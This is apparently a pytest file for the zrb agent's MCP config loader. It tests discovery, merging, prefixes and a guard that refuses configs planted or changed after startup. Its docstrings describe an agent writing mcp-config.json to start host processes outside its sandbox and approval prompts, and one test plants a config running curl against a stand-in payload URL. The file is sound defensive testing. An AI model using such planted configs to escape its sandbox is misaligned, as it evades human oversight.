"""Which `mcp-config.json` files load, and what may be started from them.

The loader's other half — capping, framing and the `purpose` line — is in
`test_mcp.py`; this file owns discovery, merging, the server entries and the
provenance guard that decides a config may be trusted at all.
"""

import json
import os
import tempfile
import threading
from typing import cast
from unittest.mock import patch

import pytest
from fastmcp.client.transports import StdioTransport
from pydantic_ai import Agent
from pydantic_ai.mcp import MCPToolset
from pydantic_ai.models.test import TestModel
from pydantic_ai.tools import ToolDefinition
from pydantic_ai.toolsets import AbstractToolset
from pydantic_ai.toolsets.abstract import ToolsetTool
from pydantic_core import SchemaValidator, core_schema

from zrb.llm.capabilities.tool import mcp as mcp_module
from zrb.llm.capabilities.tool.mcp import (
    clear_mcp_config_provenance,
    load_mcp_config,
)


@pytest.fixture
def mock_fs():
    with tempfile.TemporaryDirectory() as temp_dir:
        home_dir = os.path.join(temp_dir, "home")
        project_dir = os.path.join(home_dir, "project")
        sub_dir = os.path.join(project_dir, "subdir")

        os.makedirs(home_dir)
        os.makedirs(project_dir)
        os.makedirs(sub_dir)

        yield home_dir, project_dir, sub_dir


@pytest.fixture(autouse=True)
def _reset_config_provenance():
    """What a process loaded is the guard's baseline, meant to outlive one load —
    reset it so one test's temp home is never the baseline of the next test."""
    clear_mcp_config_provenance()
    yield
    clear_mcp_config_provenance()


def _mcp_toolset(toolset: AbstractToolset) -> MCPToolset:
    """The MCPToolset under the purpose wrapper `load_mcp_config` puts around it."""
    return cast("MCPToolset", getattr(toolset, "wrapped", toolset))


def test_mcp_toolset_factory_instantiation(mock_fs):
    home_dir, project_dir, sub_dir = mock_fs

    # Create mcp-config.json in home with Stdio server
    with open(os.path.join(home_dir, "mcp-config.json"), "w") as f:
        json.dump(
            {
                "mcpServers": {
                    "stdio_server": {
                        "command": "echo",
                        "args": ["${MY_VAR:-hello}"],
                        "env": {"TEST_ENV": "value"},
                    }
                }
            },
            f,
        )

    # Create mcp-config.json in project with SSE server
    with open(os.path.join(project_dir, "mcp-config.json"), "w") as f:
        json.dump(
            {"mcpServers": {"sse_server": {"url": "http://localhost:8080/sse"}}}, f
        )

    # Mock os.path.expanduser and os.getcwd
    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
    ):

        toolsets = load_mcp_config()

        assert len(toolsets) == 2
        assert all(isinstance(_mcp_toolset(t), MCPToolset) for t in toolsets)

        by_id = {t.id: t for t in toolsets}
        assert set(by_id) == {"stdio_server", "sse_server"}

        # Stdio: transport is a StdioTransport built from command/args/env
        stdio_transport = _mcp_toolset(by_id["stdio_server"]).client.transport
        assert isinstance(stdio_transport, StdioTransport)
        assert stdio_transport.command == "echo"
        # MY_VAR not set → falls back to default "hello"
        assert stdio_transport.args == ["hello"]
        assert stdio_transport.env == {"TEST_ENV": "value"}

        # URL-based servers: FastMCP infers the transport from the URL string; we just check
        # the toolset was created with the right id.
        assert by_id["sse_server"].id == "sse_server"


def test_mcp_toolset_factory_overrides(mock_fs):
    home_dir, project_dir, sub_dir = mock_fs

    with open(os.path.join(home_dir, "mcp-config.json"), "w") as f:
        json.dump({"mcpServers": {"server1": {"command": "cmd1"}}}, f)

    with open(os.path.join(project_dir, "mcp-config.json"), "w") as f:
        json.dump({"mcpServers": {"server1": {"command": "cmd2"}}}, f)

    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
    ):

        toolsets = load_mcp_config()

        assert len(toolsets) == 1
        assert isinstance(_mcp_toolset(toolsets[0]), MCPToolset)
        transport = _mcp_toolset(toolsets[0]).client.transport
        assert isinstance(transport, StdioTransport)
        assert transport.command == "cmd2"


class _FakeMCPToolset(AbstractToolset[None]):
    """A stand-in server: named tools, permissive argument validation — as MCP's
    own tools are, which is why a `purpose` added to their schema survives to the
    drop step instead of being refused before the toolset is reached."""

    def __init__(self, id: str, names: "list[str]") -> None:
        self._id = id
        self.names = names

    @property
    def id(self) -> str:
        return self._id

    async def get_tools(self, ctx):
        return {
            name: ToolsetTool(
                toolset=self,
                tool_def=ToolDefinition(
                    name=name,
                    parameters_json_schema={"type": "object", "properties": {}},
                ),
                max_retries=1,
                args_validator=SchemaValidator(core_schema.any_schema()),
            )
            for name in self.names
        }

    async def call_tool(self, name, tool_args, ctx, tool):
        return "ok"


def _fake_mcp_toolset(*_args, id, **_kwargs):
    return _FakeMCPToolset(id=id, names=["type_text", "t" * 60])


def test_mcp_config_prefix_renames_tools_and_skips_overlong_names(mock_fs):
    home_dir, _, sub_dir = mock_fs
    with open(os.path.join(home_dir, "mcp-config.json"), "w") as f:
        json.dump(
            {
                "mcpServers": {
                    "desktop": {"command": "cmd", "prefix": "desk"},
                    "browser": {"command": "cmd"},
                }
            },
            f,
        )

    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
        patch("zrb.llm.engine.agent.types.MCPToolset", side_effect=_fake_mcp_toolset),
        patch("zrb.llm.capabilities.tool.mcp.zrb_print") as mock_print,
    ):
        toolsets = load_mcp_config()
        called = json.loads(Agent(TestModel(), toolsets=toolsets).run_sync("go").output)

    assert set(called) == {"desk_type_text", "type_text", "t" * 60}
    assert "desk_" + "t" * 60 in mock_print.call_args.args[0]


@pytest.mark.parametrize("prefix", [True, 5, "", "has space", "x" * 63])
def test_mcp_config_skips_a_server_with_an_invalid_prefix(mock_fs, prefix):
    home_dir, _, sub_dir = mock_fs
    with open(os.path.join(home_dir, "mcp-config.json"), "w") as f:
        json.dump({"mcpServers": {"desktop": {"command": "cmd", "prefix": prefix}}}, f)

    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
        patch("zrb.llm.capabilities.tool.mcp.zrb_print") as mock_print,
    ):
        toolsets = load_mcp_config()

    assert toolsets == []
    assert "prefix must be" in mock_print.call_args.args[0]


def test_mcp_config_skips_home_when_cwd_is_a_sibling_of_home(tmp_path):
    home_dir = tmp_path / "alice"
    sibling = tmp_path / "alice2" / "project"
    home_dir.mkdir()
    sibling.mkdir(parents=True)
    (home_dir / "mcp-config.json").write_text(
        json.dumps({"mcpServers": {"home_server": {"command": "cmd"}}})
    )

    with (
        patch("os.path.expanduser", return_value=str(home_dir)),
        patch("os.getcwd", return_value=str(sibling)),
    ):
        toolsets = load_mcp_config()

    assert toolsets == []


def test_mcp_config_written_after_the_first_load_is_not_spawned(mock_fs):
    """The attack: the agent writes `mcp-config.json`, the next tool build would
    hand its `command` to a stdio server — a host process outside the sandbox,
    the filesystem gate and every approval prompt. The loader must refuse it."""
    home_dir, _, sub_dir = mock_fs
    config_path = os.path.join(home_dir, "mcp-config.json")

    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
        patch("zrb.llm.capabilities.tool.mcp.zrb_print") as mock_print,
    ):
        # zrb started with no config at all; that empty set is the baseline.
        assert load_mcp_config() == []

        with open(config_path, "w") as f:
            json.dump({"mcpServers": {"planted": {"command": "host-command"}}}, f)

        assert load_mcp_config() == []

    warnings = [call.args[0] for call in mock_print.call_args_list]
    assert any(
        config_path in warning and "appeared" in warning for warning in warnings
    ), warnings


def test_mcp_config_present_before_the_first_load_keeps_working(mock_fs):
    """The guard must not cost an ordinary setup: what zrb found at start keeps
    loading, while a file that appeared beside it is refused."""
    home_dir, project_dir, sub_dir = mock_fs
    trusted_path = os.path.join(home_dir, "mcp-config.json")
    planted_path = os.path.join(project_dir, "mcp-config.json")
    with open(trusted_path, "w") as f:
        json.dump({"mcpServers": {"home_server": {"command": "echo"}}}, f)

    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
        patch("zrb.llm.capabilities.tool.mcp.zrb_print") as mock_print,
    ):
        assert _toolset_ids(load_mcp_config()) == ["home_server"]

        with open(planted_path, "w") as f:
            json.dump({"mcpServers": {"planted": {"command": "host-command"}}}, f)

        assert _toolset_ids(load_mcp_config()) == ["home_server"]

    warnings = [call.args[0] for call in mock_print.call_args_list]
    assert any(planted_path in warning for warning in warnings), warnings


def test_two_loads_racing_at_startup_both_take_the_same_baseline(mock_fs):
    """The baseline is decided and written under one lock.

    Reading the map, deciding whether this is the first load, and filling it in
    were separate steps: a second load could start between them, see a map
    already begun, and refuse a config its sibling had just vouched for — the
    ordinary setup broken by a race at startup.
    """
    home_dir, _, sub_dir = mock_fs
    config_path = os.path.join(home_dir, "mcp-config.json")
    with open(config_path, "w") as f:
        json.dump({"mcpServers": {"home_server": {"command": "echo"}}}, f)

    first_load_reading = threading.Event()
    second_load_finished = threading.Event()
    results: dict[str, list[str]] = {}

    def read_config(path):
        if threading.current_thread().name == "first-load":
            first_load_reading.set()
            # Give the racing load every chance to get in. Without the lock it
            # arrives here, sees a map already begun, and refuses the file.
            second_load_finished.wait(1.0)
        with open(path, "rb") as f:
            return f.read()

    def run_load(name):
        if name == "second-load":
            first_load_reading.wait(1.0)
        try:
            results[name] = _toolset_ids(load_mcp_config())
        finally:
            if name == "second-load":
                second_load_finished.set()

    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
        patch.object(mcp_module, "_read_config_bytes", new=read_config),
    ):
        first = threading.Thread(
            target=run_load, args=("first-load",), name="first-load"
        )
        second = threading.Thread(
            target=run_load, args=("second-load",), name="second-load"
        )
        first.start()
        second.start()
        first.join(10)
        second.join(10)

    assert results["first-load"] == ["home_server"]
    assert results["second-load"] == ["home_server"]


def test_mcp_config_changed_after_the_first_load_is_not_spawned(mock_fs):
    """Rewriting a config zrb already loaded is the same attack one step later."""
    home_dir, _, sub_dir = mock_fs
    config_path = os.path.join(home_dir, "mcp-config.json")
    with open(config_path, "w") as f:
        json.dump({"mcpServers": {"echo_server": {"command": "echo"}}}, f)

    with (
        patch("os.path.expanduser", return_value=home_dir),
        patch("os.getcwd", return_value=sub_dir),
        patch("zrb.llm.capabilities.tool.mcp.zrb_print") as mock_print,
    ):
        assert _toolset_ids(load_mcp_config()) == ["echo_server"]

        with open(config_path, "w") as f:
            json.dump(
                {
                    "mcpServers": {
                        "echo_server": {
                            "command": "curl",
                            "args": ["https://example.test/payload"],
                        }
                    }
                },
                f,
            )

        assert load_mcp_config() == []

    warnings = [call.args[0] for call in mock_print.call_args_list]
    assert any(
        config_path in warning and "changed" in warning for warning in warnings
    ), warnings


def test_mcp_config_that_cannot_be_read_warns_and_is_skipped(tmp_path):
    home_dir = tmp_path / "home"
    home_dir.mkdir()
    config_path = home_dir / "mcp-config.json"
    config_path.write_text(json.dumps({"mcpServers": {"planted": {"command": "cmd"}}}))
    config_path.chmod(0o000)
    if os.access(config_path, os.R_OK):
        pytest.skip("a privileged user reads a 000 file")
    try:
        with (
            patch("os.path.expanduser", return_value=str(home_dir)),
            patch("os.getcwd", return_value=str(home_dir)),
            patch("zrb.llm.capabilities.tool.mcp.zrb_print") as mock_print,
        ):
            assert load_mcp_config() == []
    finally:
        config_path.chmod(0o644)

    warnings = [call.args[0] for call in mock_print.call_args_list]
    assert any(str(config_path) in warning for warning in warnings), warnings


def test_mcp_config_that_is_not_json_warns_and_is_skipped(tmp_path):
    home_dir = tmp_path / "home"
    home_dir.mkdir()
    config_path = home_dir / "mcp-config.json"
    config_path.write_text("{ not json at all")

    with (
        patch("os.path.expanduser", return_value=str(home_dir)),
        patch("os.getcwd", return_value=str(home_dir)),
        patch("zrb.llm.capabilities.tool.mcp.zrb_print") as mock_print,
    ):
        assert load_mcp_config() == []

    warning = mock_print.call_args.args[0]
    assert str(config_path) in warning and "Failed to load" in warning


def _toolset_ids(toolsets) -> "list[str]":
    return [toolset.id for toolset in toolsets]
